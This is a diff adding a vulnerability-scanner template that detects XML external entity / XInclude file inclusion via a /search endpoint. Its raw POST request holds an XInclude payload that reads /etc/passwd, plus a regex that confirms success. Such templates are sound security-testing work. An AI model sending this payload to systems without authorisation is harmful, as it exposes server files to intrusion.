@@ -1,0 +1,23 @@
+id: xxe-via-search-lfi-include-bypass
+
+info:
+  name: XXE via search parameter
+  author: reewardius
+  severity: high
+  tags: xxe,generic
+  
+http:
+  - raw:
+      - |
+        POST /search HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+        Content-Type: application/xml;charset=UTF-8
+        
+        <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file://../../../../etc/passwd"/></foo>
+        
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
